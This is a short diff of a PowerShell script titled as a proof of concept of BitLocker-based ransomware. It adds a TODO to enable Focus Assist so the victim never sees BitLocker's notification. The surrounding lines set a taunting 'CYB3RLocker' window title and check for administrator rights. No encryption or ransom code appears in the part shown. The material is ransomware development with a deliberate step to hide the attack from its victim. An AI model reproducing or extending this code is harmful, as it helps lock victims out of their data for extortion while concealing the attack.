@@ -1,5 +1,9 @@
 # PoC of BitLocker based ransomware
 
+<# TODO:
+Enable focus assist to block BitLocker notification to pop up.
+#>
+
 $host.ui.RawUI.WindowTitle = 'CYB3RLocker Setup - secure your hardware and spend some money!'
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 If (!( $isAdmin )) {
